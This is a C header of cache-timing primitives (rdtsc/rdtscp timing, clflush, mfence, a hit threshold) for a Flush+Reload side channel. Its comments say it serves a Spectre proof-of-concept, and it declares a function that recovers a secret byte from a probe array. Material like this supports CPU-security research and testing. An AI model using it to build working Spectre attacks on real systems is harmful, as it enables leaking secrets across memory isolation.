#ifndef CACHE_TIMING_H
#define CACHE_TIMING_H

#include <stdint.h>
#include <stddef.h>

/* ── Cache Timing Primitives for Flush+Reload ────────────────────────────────
 *
 * Spectre relies on measuring which cache lines are warm (fast) vs cold (slow).
 * These primitives provide:
 *   1. rdtsc / rdtscp — read timestamp counter (CPU cycle counter)
 *   2. clflush — evict a cache line
 *   3. Threshold between L1-hit (~4 cycles) and DRAM (~200+ cycles)
 */

/* Threshold in cycles to distinguish L1/L2 cache hit vs main-memory access.
   Tune per-machine; ~100 cycles is typical on modern x86. */
#define CACHE_HIT_THRESHOLD 100

/* Read the CPU timestamp counter (RDTSC) */
static inline uint64_t rdtsc_begin(void) {
#if defined(__x86_64__) || defined(__i386__)
    uint32_t lo, hi;
    /* CPUID serializes the pipeline before RDTSC */
    __asm__ volatile (
        "cpuid\n\t"
        "rdtsc\n\t"
        : "=a"(lo), "=d"(hi)
        :: "rbx", "rcx"
    );
    return ((uint64_t)hi << 32) | lo;
#else
    /* Fallback: not a real cycle counter, but avoids compile failure */
    return 0;
#endif
}

static inline uint64_t rdtsc_end(void) {
#if defined(__x86_64__) || defined(__i386__)
    uint32_t lo, hi;
    __asm__ volatile (
        "rdtscp\n\t"
        "mov %%eax, %0\n\t"
        "mov %%edx, %1\n\t"
        "cpuid\n\t"
        : "=r"(lo), "=r"(hi)
        :: "rax", "rbx", "rcx", "rdx"
    );
    return ((uint64_t)hi << 32) | lo;
#else
    return 1;
#endif
}

/* Flush a cache line containing `addr` */
static inline void cache_flush(const void *addr) {
#if defined(__x86_64__) || defined(__i386__)
    __asm__ volatile ("clflush (%0)" :: "r"(addr) : "memory");
#else
    (void)addr;
#endif
}

/* Memory fence */
static inline void mfence(void) {
#if defined(__x86_64__) || defined(__i386__)
    __asm__ volatile ("mfence" ::: "memory");
#else
    __asm__ volatile ("" ::: "memory");
#endif
}

/* Time a single memory access to addr.  Returns cycles. */
uint64_t time_access(const void *addr);

/* Flush the entire probe array from the cache */
void flush_probe_array(uint8_t *probe_array, size_t probe_size, int stride);

/* Score the probe array to find which index is cached.
   Returns the most likely secret byte (0-255). */
int recover_byte(uint8_t *probe_array, int stride, uint64_t scores[256]);

#endif /* CACHE_TIMING_H */
